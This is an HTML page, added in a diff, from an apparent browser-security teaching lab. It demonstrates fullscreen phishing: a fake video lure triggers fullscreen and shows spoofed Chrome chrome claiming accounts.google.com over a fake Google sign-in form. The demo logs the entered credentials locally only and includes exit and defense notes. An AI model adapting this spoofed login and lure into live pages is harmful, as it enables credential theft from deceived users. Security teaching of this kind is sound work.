@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo 07 — Fullscreen Phishing | ZENTRIX Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/lab.css">
+<style>
+.fs-stage { padding: 30px; text-align: center; min-height: 360px; }
+.fake-browser {
+    display: none; position: fixed; inset: 0;
+    background: #fff; z-index: 99999;
+    font-family: -apple-system, sans-serif;
+}
+.fake-browser.active { display: block; }
+.fake-chrome {
+    background: #dee1e6; padding: 8px 12px;
+    display: flex; align-items: center; gap: 8px;
+}
+.fake-dots { display: flex; gap: 6px; }
+.fake-dots span { width: 12px; height: 12px; border-radius: 50%; }
+.fake-dots span:nth-child(1){ background:#ff5f57; }
+.fake-dots span:nth-child(2){ background:#febc2e; }
+.fake-dots span:nth-child(3){ background:#28c840; }
+.fake-url {
+    flex: 1; background: #fff; padding: 6px 12px;
+    border-radius: 4px; font-size: 0.8rem; color: #333;
+    text-align: center;
+}
+.fake-url .lock { color: #2e7d32; }
+.fake-content {
+    padding: 60px 20px; max-width: 400px; margin: 0 auto;
+}
+.fake-content h2 { color: #333; margin-bottom: 8px; }
+.fake-content input {
+    width: 100%; padding: 12px; margin: 8px 0;
+    border: 1px solid #ddd; border-radius: 6px;
+}
+.fake-content button {
+    width: 100%; padding: 12px; background: #1a73e8;
+    color: #fff; border: none; border-radius: 6px; margin-top: 8px;
+}
+</style>
+</head>
+<body class="lab-demo">
+<div class="lab-warning">⚠ DEMO 07 — Fullscreen Phishing | Authorized research only</div>
+<nav class="lab-nav">
+    <a href="index.html">← VULN LAB</a>
+    <span class="demo-id">DEMO 07 / FULLSCREEN PHISHING</span>
+    <a href="../index.html">CONSOLE</a>
+</nav>
+
+<div class="lab-body">
+    <h1 class="lab-title">FULLSCREEN PHISHING</h1>
+    <span class="lab-tag">FULLSCREEN API · FAKE CHROME</span>
+    <p class="lab-desc">
+        Page requests fullscreen then renders fake browser chrome with spoofed URL bar.
+        Users believe they are on accounts.google.com while entering credentials on attacker page.
+    </p>
+
+    <div class="lab-stage fs-stage">
+        <span class="lab-stage-label">[ TRIGGER FULLSCREEN ATTACK ]</span>
+        <p style="color:var(--lab-text);margin-bottom:20px">Click to simulate "Watch Video" bait:</p>
+        <button class="lab-btn danger" id="fsBtn">▶ Watch Free Premium Video</button>
+    </div>
+    <div class="lab-log" id="log">[*] Fullscreen attack not yet triggered...</div>
+</div>
+
+<div class="fake-browser" id="fakeBrowser">
+    <div class="fake-chrome">
+        <div class="fake-dots"><span></span><span></span><span></span></div>
+        <div class="fake-url"><span class="lock">🔒</span> https://accounts.google.com/signin</div>
+    </div>
+    <div class="fake-content">
+        <h2>Sign in</h2>
+        <p style="color:#666;margin-bottom:20px">Use your Google Account</p>
+        <input type="email" placeholder="Email or phone" id="fakeEmail">
+        <input type="password" placeholder="Password" id="fakePass">
+        <button type="button" id="fakeSubmit">Next</button>
+        <button type="button" id="exitFs" style="margin-top:20px;background:#666;width:100%;padding:10px;border:none;color:#fff;border-radius:6px;cursor:pointer">Exit Demo (ESC)</button>
+    </div>
+</div>
+
+<div class="lab-info">
+    <strong>Defense:</strong> Browsers show "Press Esc to exit"; users must verify URL. Fullscreen API requires user gesture.
+</div>
+
+<script>
+var fakeBrowser = document.getElementById('fakeBrowser');
+document.getElementById('fsBtn').addEventListener('click', function() {
+    var el = document.documentElement;
+    var req = el.requestFullscreen || el.webkitRequestFullscreen;
+    if (req) {
+        req.call(el).then(function() {
+            fakeBrowser.classList.add('active');
+            document.getElementById('log').innerHTML = '<span class="hit">[!] FULLSCREEN PHISHING ACTIVE</span>\nFake chrome rendered. Real URL hidden.';
+        }).catch(function() {
+            fakeBrowser.classList.add('active');
+            document.getElementById('log').innerHTML = '<span class="hit">[!] SIMULATED (fullscreen blocked)</span>\nFake chrome shown in overlay mode.';
+        });
+    } else {
+        fakeBrowser.classList.add('active');
+    }
+});
+function exitDemo() {
+    fakeBrowser.classList.remove('active');
+    if (document.fullscreenElement) document.exitFullscreen();
+}
+document.getElementById('exitFs').addEventListener('click', exitDemo);
+document.addEventListener('fullscreenchange', function() {
+    if (!document.fullscreenElement) fakeBrowser.classList.remove('active');
+});
+document.getElementById('fakeSubmit').addEventListener('click', function() {
+    var e = document.getElementById('fakeEmail').value;
+    var p = document.getElementById('fakePass').value;
+    document.getElementById('log').innerHTML =
+        '<span class="hit">[!] CREDENTIALS HARVESTED</span>\nemail: ' + (e||'(empty)') + '\npass: ' + (p ? '••••••' : '(empty)');
+    exitDemo();
+});
+</script>
+</body>
+</html>
